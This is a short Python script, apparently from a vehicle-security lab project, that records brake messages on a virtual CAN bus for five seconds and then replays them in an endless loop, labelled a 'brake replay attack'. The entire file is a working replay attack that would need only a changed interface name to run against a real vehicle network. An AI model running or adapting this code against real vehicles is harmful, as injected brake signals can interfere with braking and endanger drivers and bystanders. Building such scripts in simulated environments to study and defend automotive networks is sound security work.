import can
import time

# Import global variables from config file
from src.core.config import CAN_ID_BRAKE

# Connect to virtual CAN network
bus = can.interface.Bus(channel='vcan0', interface='socketcan')

print("Brake replay attack started... Press Ctrl+C to stop.")

# Initialize buffer for storing recorded messages
buffer = []

try:
    # Record messages from CAN bus
    print("Recording brake messages...")

    start_time = time.time()
    
    # Record CAN messages for 5 seconds
    while time.time() - start_time < 5:  
        msg = bus.recv(timeout=0.1)

        # Ensure messages are being sent for brake then save in buffer
        if msg is not None and msg.arbitration_id == CAN_ID_BRAKE:
            buffer.append(msg.data[0])

    print(f"Recorded {len(buffer)} brake messages")


    # Replay messages recorded earlier 
    print("Replaying brake messages...")

    while True:
        
        # Send brake messages sotred in CAN
        for value in buffer:
            msg = can.Message(
                arbitration_id=CAN_ID_BRAKE,
                data=[value],
                is_extended_id=False
            )
            bus.send(msg)
            
            # Setting signal frequency
            time.sleep(0.05)  

# If interupt sent stop sneding messages and print
except KeyboardInterrupt:
    print("\nReplay attack stopped.")